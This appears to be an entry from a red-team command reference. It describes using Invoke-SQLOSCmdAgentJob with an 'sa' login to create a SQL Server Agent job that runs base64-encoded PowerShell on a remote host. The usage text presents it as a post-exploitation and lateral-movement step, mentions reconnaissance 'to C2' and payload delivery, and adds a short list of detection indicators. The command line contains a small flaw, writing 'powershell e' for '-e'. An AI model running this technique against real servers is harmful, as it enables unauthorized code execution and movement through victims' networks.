---
type: code
language: ps1
verified: true
tags:
  - sql-agent
  - powershell-execution
  - remote-job
platforms:
  - Windows
  - SQL Server
validated: true
---

# Invoke-SQLOSCmdAgentJob Execute PowerShell

## Code

```ps1
Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell e <base64encodedscript>" -Verbose
Subsystem Options:
–Subsystem CmdExec
-SubSystem PowerShell
–Subsystem VBScript
–Subsystem Jscript
```

## Description

This PowerShell code uses the Invoke-SQLOSCmdAgentJob cmdlet (from the SQLOS module) to remotely create and execute a SQL Server Agent Job with a PowerShell subsystem step. It allows running base64-encoded PowerShell scripts on the target SQL host, useful for command execution in post-exploitation scenarios. The code includes notes on alternative subsystems for flexibility.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| -Username | SQL login username with job permissions | sa |
| -Password | Password for the SQL login | Password1234 |
| -Instance | Target SQL Server instance name | SERVER\SQLEXPRESS |
| -Command | Base64-encoded PowerShell command (use powershell -e for encoding) | powershell e [base64 of 'nslookup example.com'] |
| <base64encodedscript> | Placeholder for the encoded script payload | VGVzdC1Db21wdXRlcg== (base64 of 'Test-Computer') |

## Usage

Install the SQLOS module on your attacking machine (Install-Module SQLOS), then run this in a PowerShell session to execute commands on the remote SQL host. Ideal for scenarios with SQL access but no direct host shell, such as during lateral movement. Customize the -Command for reconnaissance (e.g., nslookup to C2) or payload delivery.

## Detection

- PowerShell module logging capturing SQLOS cmdlet invocations.
- SQL Server error logs showing Agent Job creation from external connections.
- Network traffic to SQL port 1433 with authentication from unusual sources.
- Endpoint detection of base64-decoded PowerShell execution under sqlservr.exe process.

## Related

- [[procedures/sql-agent-job-powershell-execution]]
- [[commands/create-powershell-job-and-execute-nslookup]]
